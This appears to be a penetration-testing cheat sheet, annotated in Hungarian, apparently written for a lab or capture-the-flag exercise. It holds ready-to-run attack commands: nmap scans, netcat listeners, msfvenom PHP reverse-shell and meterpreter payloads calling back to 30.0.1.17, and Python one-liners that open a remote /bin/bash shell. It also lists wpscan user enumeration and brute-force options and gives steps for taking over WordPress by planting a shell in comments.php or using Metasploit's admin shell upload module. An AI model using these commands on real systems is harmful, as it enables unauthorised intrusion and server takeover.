## Advanced ping
``` sh
sudo nmap -sn <IP>
```
## Port scan
``` sh
sudo nmap -sS -sV <IP>
```

## Dirbuster wordlist
``` sh
/usr/share/wordlists/dirb/common.txt
```

## Password list 
``` sh
/usr/share/wordlists/rockyou.txt
```

## Listener
``` sh
nc -lvnp 4444
```
``` sh
nc -lvnp 5555
```

## PHP reverse shell generator
``` sh
msfvenom -p php/reverse_php LHOST=30.0.1.17 LPORT=4444 -f raw > rshell.php
```
Ezt fel kell tölteni csinálni egy listeneret és lefuttatni a Target gépen, ezáltal kapunk egy PHP reverse shellt

## SHELL Chaining PHP esetén (nem PHP-nál is működik)
``` python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("30.0.1.17",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```
``` python
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("30.0.1.17",5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

## Nem PHP esetén
``` python
python3 -c "import pty; pty.spawn('/bin/bash')"
```

# wpscan
wpscan --help
* --url URL    --> url megadása
* -o FILE      --> fájlba mentés
* -f FORMAT    --> mentés formátuma
* --detection-mode MODE --> passive, aggressive, mixed
* --user-agent AGENT --> agent megadása
* --random-user-agent
* --http-auth login:password --> Basic auth login
* -e --> mire vagyunk kíváncsiak
  * -e vp --> sérülékeny plugin
  * -e u --> minden user meghatározása
* -P --> jelszavak brute-forceolása
* --login-uri URI  --> ha az oldal nem az eredti IP-n található hanem máshol pl.: http://40.0.4.16/secret
* --stealthy --> elrejtőzés

## Web server megtalálása
Appearance --> Theme editor
Érdemes a comments.php-t buherálni
1. Shell kód generálása (msfvenom)
2. comments.php-be beírni
3. Listener attack gépen (nc)
4. Egy komment megnyitása

Vagy ami könnyebb v

## WordPress feltörés shell generálás
msfconsole
```
search wp admin shell
```
Ha megvan a szám akkor
```
use {szám}
```
vagy
```
use exploit/unix/webapp/wp_admin_shell_upload
```

## Meterpreter php script
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=30.0.1.17 LPORT=4444 -f raw > rshell.php
```
msfconsoleban
```
use exploit/multi/handler
```
Ez csak handler!!!
